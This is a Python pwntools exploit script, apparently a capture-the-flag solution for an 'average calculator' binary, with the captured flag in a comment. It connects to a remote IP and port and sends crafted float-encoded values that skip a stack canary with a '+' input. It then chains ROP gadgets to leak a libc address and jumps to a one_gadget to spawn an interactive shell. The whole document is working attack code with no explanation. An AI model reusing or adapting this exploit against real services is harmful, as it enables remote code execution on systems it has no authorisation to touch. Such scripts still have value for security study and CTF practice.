from pwn import *
import time
from decimal import Decimal

#ASIS{7r1vi4__e4sY_meDiUm_0r__ev3N_h4rD_i75_th3_Pr0b13m!!}

#r = process('./precise_avg.elf', env={'LD_PRELOAD': './libc6_2.27-3ubuntu1_amd64.so'})
r = remote('82.196.10.106', 12499)

rop = [
0x4009c3, 
0x600fb0,
0x0000000000400630,
0x00000000004007D0
]

r.sendafter(': ', str(33 + 1 + 1 + len(rop)) + '\n')

for i in range(33):
	print i
	r.send('1\n')

r.send('+\n')
time.sleep(0.1)
r.send('1\n')

for i in rop:
	r.send(str(Decimal(struct.unpack('d', p64(i))[0])) + '\n')

libc = u64(r.recvuntil('\n+++++++++++++++++++++++++++++++++++++').split('\n+++++++++++++++++++++++++++++++++++++')[0][-6:].ljust(8, '\x00')) - 0x809c0

log.success('Libc @ ' + hex(libc))

rop = [
libc + 0x4f2c5
]

r.sendafter(': ', str(33 + 1 + 1 + len(rop)) + '\n')

for i in range(33):
	print i
	r.send('1\n')

r.send('+\n')
time.sleep(0.1)
r.send('1\n')

pause()

for i in rop:
	r.send(str(Decimal(struct.unpack('d', p64(i))[0])) + '\n')

r.interactive()
